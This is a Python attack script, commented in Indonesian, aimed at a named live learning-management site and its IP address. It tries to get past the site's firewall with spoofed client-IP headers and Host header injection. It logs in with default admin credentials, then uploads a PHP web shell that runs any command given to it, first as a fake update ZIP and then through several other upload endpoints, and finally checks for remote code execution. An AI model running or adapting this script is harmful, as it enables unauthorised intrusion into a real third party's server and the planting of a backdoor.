"""
ROCKET LMS - IP SPOOFING WAF BYPASS
====================================

WAF biasanya memiliki whitelisted IPs yang dipercaya:
1. localhost (127.0.0.1, ::1)
2. IP server sendiri (188.40.174.168)
3. Internal networks (10.x, 192.168.x, 172.16-31.x)
4. Load balancer / CDN IPs
5. Cloudflare ranges

Kita akan spoof IP kita menjadi IP yang trusted!
"""

import requests
import re
import time
import random
import io
import zipfile

BASE_URL = "https://lms.rocket-soft.org"
HOST = "lms.rocket-soft.org"
TARGET_IP = "188.40.174.168"  # Real IP of lms.rocket-soft.org

ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

# Comprehensive list of trusted/whitelisted IPs to try
TRUSTED_IPS = [
    # Localhost / Loopback
    "127.0.0.1",
    "127.0.0.2",
    "127.1.1.1",
    "localhost",
    "::1",
    "0.0.0.0",
    "0.0.0.1",
    
    # Target server's own IP
    "188.40.174.168",
    TARGET_IP,
    
    # Private/Internal Network Ranges (RFC 1918)
    "10.0.0.1",
    "10.10.10.1",
    "10.0.0.254",
    "10.255.255.1",
    "192.168.0.1",
    "192.168.1.1",
    "192.168.10.1",
    "192.168.100.1",
    "172.16.0.1",
    "172.17.0.1",  # Docker default
    "172.18.0.1",
    "172.31.255.1",
    
    # Common internal hostnames
    "internal",
    "admin",
    "backend",
    "api",
    "localhost.localdomain",
    
    # Hetzner (server provider) network
    "188.40.0.1",
    "188.40.174.1",
    
    # Cloudflare IPs (commonly trusted)
    "103.21.244.1",
    "103.22.200.1",
    "103.31.4.1",
    "104.16.0.1",
    "108.162.192.1",
    "131.0.72.1",
    "141.101.64.1",
    "162.158.0.1",
    "172.64.0.1",
    "173.245.48.1",
    "188.114.96.1",
    "190.93.240.1",
    "197.234.240.1",
    "198.41.128.1",
    
    # AWS common ranges
    "52.0.0.1",
    "54.0.0.1",
    "35.0.0.1",
    
    # Google Cloud
    "34.0.0.1",
    "35.192.0.1",
]

# Headers used for IP spoofing
IP_HEADERS = [
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Client-IP",
    "True-Client-IP",
    "Client-IP",
    "CF-Connecting-IP",  # Cloudflare
    "Fastly-Client-IP",  # Fastly CDN
    "X-Cluster-Client-IP",
    "X-Forwarded",
    "Forwarded-For",
    "Forwarded",
    "X-ProxyUser-Ip",
    "X-Original-URL",
    "X-Originally-Forwarded-For",
    "X-Originating-URL",
    "X-Rewrite-URL",
    "X-Host",
]

session = requests.Session()
session.timeout = 30

def login(spoof_ip=None, spoof_header=None):
    """Login with spoofed IP"""
    headers = {}
    if spoof_ip and spoof_header:
        headers[spoof_header] = spoof_ip
    
    r = session.get(f"{BASE_URL}/admin/login", headers=headers)
    csrf = re.search(r'name="_token" value="([^"]+)"', r.text)
    if csrf:
        session.post(f"{BASE_URL}/admin/login", 
                    data={"_token": csrf.group(1), "email": ADMIN_EMAIL, "password": ADMIN_PASS},
                    headers=headers)
    return session.cookies.get_dict()

def get_csrf(spoof_headers=None):
    headers = spoof_headers or {}
    r = session.get(f"{BASE_URL}/admin/settings", headers=headers)
    match = re.search(r'name="_token" value="([^"]+)"', r.text)
    return match.group(1) if match else None

def create_shell_zip():
    """Create malicious ZIP with shell"""
    shell = "<?php system($_GET['c']); ?>"
    
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w') as zf:
        config = '{"directory":[{"name":[]}],"files":[{"root_directory":"shell.php","update_directory":"public/shell.php"}]}'
        zf.writestr("config.json", config)
        zf.writestr("shell.php", shell)
    zip_buffer.seek(0)
    return zip_buffer.read()

def attempt_rce_with_spoof(ip, header):
    """Attempt RCE with specific IP spoof"""
    spoof_headers = {header: ip}
    
    try:
        # Login with spoofed IP
        login(ip, header)
        csrf = get_csrf(spoof_headers)
        
        if not csrf:
            return None
        
        # Try UpdateController with spoofed IP
        zip_data = create_shell_zip()
        files = {'file': ('update.zip', zip_data, 'application/zip')}
        data = {'_token': csrf}
        
        r = session.post(f"{BASE_URL}/admin/update/basic-update", 
                        files=files, data=data, headers=spoof_headers)
        
        return r.status_code
        
    except Exception as e:
        return f"Error: {str(e)[:30]}"

def check_shell():
    """Check if shell was uploaded"""
    try:
        r = session.get(f"{BASE_URL}/shell.php?c=id", timeout=5)
        if "uid=" in r.text:
            return True
        r = session.get(f"{BASE_URL}/public/shell.php?c=id", timeout=5)
        if "uid=" in r.text:
            return True
    except:
        pass
    return False

def comprehensive_ip_spoof_attack():
    """
    Try ALL combinations of IPs and headers
    """
    print("\n" + "="*60)
    print("    COMPREHENSIVE IP SPOOFING ATTACK")
    print("="*60)
    print(f"\n[*] Target: {BASE_URL}")
    print(f"[*] Target IP: {TARGET_IP}")
    print(f"[*] IPs to try: {len(TRUSTED_IPS)}")
    print(f"[*] Headers to try: {len(IP_HEADERS)}")
    print(f"[*] Total combinations: {len(TRUSTED_IPS) * len(IP_HEADERS)}")
    
    # First, try the most likely to work combinations
    priority_ips = [
        "127.0.0.1",
        "localhost", 
        TARGET_IP,
        "10.0.0.1",
        "192.168.1.1",
    ]
    
    priority_headers = [
        "X-Forwarded-For",
        "X-Real-IP",
        "True-Client-IP",
        "CF-Connecting-IP",
        "X-Client-IP",
    ]
    
    print("\n[*] Phase 1: Priority combinations...")
    
    for ip in priority_ips:
        for header in priority_headers:
            print(f"\r    [{header}]: {ip}            ", end="", flush=True)
            
            result = attempt_rce_with_spoof(ip, header)
            
            if result == 200:
                print(f"\n\n[!!!] POSSIBLE BYPASS: {header}: {ip} -> Status 200!")
                
                # Check if shell was created
                if check_shell():
                    print(f"\n[!!!] RCE SUCCESS!")
                    print(f"[!!!] IP Spoof: {header}: {ip}")
                    print(f"[!!!] Shell: {BASE_URL}/shell.php?c=id")
                    return True
                    
            elif result not in [403, 419, 302]:
                print(f"\n    [!] Interesting: {header}: {ip} -> {result}")
            
            time.sleep(0.5)
    
    print("\n\n[*] Phase 2: All combinations (faster scan)...")
    
    # Try all combinations
    for ip in TRUSTED_IPS:
        for header in IP_HEADERS:
            # Skip already tried
            if ip in priority_ips and header in priority_headers:
                continue
                
            result = attempt_rce_with_spoof(ip, header)
            
            if result == 200:
                print(f"\n[!!!] POSSIBLE BYPASS: {header}: {ip}")
                if check_shell():
                    print(f"\n[!!!] RCE SUCCESS with {header}: {ip}!")
                    return True
            elif result not in [403, 419, 302, None] and "Error" not in str(result):
                print(f"\n    [!] {header}: {ip} -> {result}")
            
            time.sleep(0.3)
    
    return False

def multi_header_spoof():
    """
    Try spoofing with MULTIPLE headers at once
    """
    print("\n" + "="*60)
    print("    MULTI-HEADER IP SPOOFING")
    print("="*60)
    
    login()
    csrf = get_csrf()
    
    multi_spoof_configs = [
        # All localhost
        {
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "True-Client-IP": "127.0.0.1",
            "X-Client-IP": "127.0.0.1",
        },
        # All target IP
        {
            "X-Forwarded-For": TARGET_IP,
            "X-Real-IP": TARGET_IP,
            "True-Client-IP": TARGET_IP,
            "CF-Connecting-IP": TARGET_IP,
        },
        # Chain of IPs (proxy chain simulation)
        {
            "X-Forwarded-For": f"127.0.0.1, {TARGET_IP}, 10.0.0.1",
        },
        # Mix internal
        {
            "X-Forwarded-For": "10.0.0.1",
            "X-Real-IP": "192.168.1.1",
            "True-Client-IP": "127.0.0.1",
        },
        # Cloudflare simulation
        {
            "CF-Connecting-IP": "127.0.0.1",
            "X-Forwarded-For": "127.0.0.1",
            "CF-IPCountry": "US",
            "CF-Ray": "fake-ray-id",
        },
    ]
    
    for config in multi_spoof_configs:
        print(f"\n[*] Trying: {list(config.keys())}")
        
        try:
            zip_data = create_shell_zip()
            files = {'file': ('update.zip', zip_data, 'application/zip')}
            data = {'_token': csrf}
            
            r = session.post(f"{BASE_URL}/admin/update/basic-update",
                           files=files, data=data, headers=config)
            
            print(f"    Status: {r.status_code}")
            
            if r.status_code == 200:
                if check_shell():
                    print(f"\n[!!!] MULTI-HEADER RCE SUCCESS!")
                    print(f"[!!!] Headers: {config}")
                    return True
                    
        except Exception as e:
            print(f"    Error: {e}")
    
    return False

def host_header_injection():
    """
    Try Host header manipulation with IP spoofing
    """
    print("\n" + "="*60)
    print("    HOST HEADER INJECTION + IP SPOOF")
    print("="*60)
    
    login()
    csrf = get_csrf()
    
    host_variations = [
        "localhost",
        "127.0.0.1",
        TARGET_IP,
        f"{HOST}@127.0.0.1",
        f"127.0.0.1#{HOST}",
        f"{HOST}:80@127.0.0.1",
        "localhost:80",
        f"{HOST}\r\nX-Injected: true",
    ]
    
    for host in host_variations:
        print(f"\n[*] Host: {host[:40]}...")
        
        spoof_headers = {
            "Host": host,
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
        }
        
        try:
            zip_data = create_shell_zip()
            files = {'file': ('update.zip', zip_data, 'application/zip')}
            data = {'_token': csrf}
            
            r = session.post(f"{BASE_URL}/admin/update/basic-update",
                           files=files, data=data, headers=spoof_headers)
            
            print(f"    Status: {r.status_code}")
            
            if r.status_code not in [403, 419, 400]:
                if check_shell():
                    print(f"\n[!!!] HOST INJECTION RCE SUCCESS!")
                    return True
                    
        except Exception as e:
            print(f"    Error: {e}")
    
    return False

def spoof_with_other_endpoints():
    """
    Try IP spoofing on other file upload endpoints
    """
    print("\n" + "="*60)
    print("    IP SPOOF ON OTHER ENDPOINTS")
    print("="*60)
    
    login()
    csrf = get_csrf()
    
    shell = "<?php system($_GET['c']); ?>"
    
    endpoints = [
        ("/panel/files/store", "file"),
        ("/panel/setting", "avatar"),
        ("/admin/settings/general", "logo"),
        ("/admin/settings/general", "favicon"),
        ("/admin/pages/store", "image"),
        ("/admin/blog/store", "image"),
    ]
    
    spoof_headers = {
        "X-Forwarded-For": "127.0.0.1",
        "X-Real-IP": "127.0.0.1",
        "True-Client-IP": TARGET_IP,
        "CF-Connecting-IP": "127.0.0.1",
    }
    
    for endpoint, field in endpoints:
        print(f"\n[*] Endpoint: {endpoint} ({field})")
        
        try:
            files = {field: ('shell.php', shell.encode(), 'application/x-php')}
            data = {'_token': csrf}
            
            r = session.post(f"{BASE_URL}{endpoint}",
                           files=files, data=data, headers=spoof_headers)
            
            print(f"    Status: {r.status_code}")
            
            if r.status_code == 200:
                print(f"    [+] Upload accepted with IP spoof!")
                
            if r.status_code not in [403, 419, 404]:
                # Try to find the shell
                check_paths = [
                    "/storage/shell.php?c=id",
                    "/uploads/shell.php?c=id",
                    "/images/shell.php?c=id",
                ]
                
                for path in check_paths:
                    check = session.get(f"{BASE_URL}{path}")
                    if "uid=" in check.text:
                        print(f"\n[!!!] RCE SUCCESS!")
                        print(f"[!!!] Endpoint: {endpoint}")
                        print(f"[!!!] Shell: {BASE_URL}{path}")
                        return True
                        
        except Exception as e:
            print(f"    Error: {e}")
    
    return False

def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║       IP SPOOFING WAF BYPASS - TRUSTED IP CAMOUFLAGE         ║
║       Target: lms.rocket-soft.org (188.40.174.168)           ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Try comprehensive IP spoofing
    if comprehensive_ip_spoof_attack():
        return
    
    # Try multi-header spoofing
    if multi_header_spoof():
        return
    
    # Try Host header injection with IP spoof
    if host_header_injection():
        return
    
    # Try on other endpoints
    if spoof_with_other_endpoints():
        return
    
    print("\n" + "="*60)
    print("    IP SPOOFING ATTACK COMPLETE")
    print("="*60)
    
    if check_shell():
        print("\n[+] SHELL FOUND!")
    else:
        print("\n[*] WAF validates real client IP, not headers.")
        print("[*] True IP spoofing requires network-level attack.")

if __name__ == "__main__":
    main()
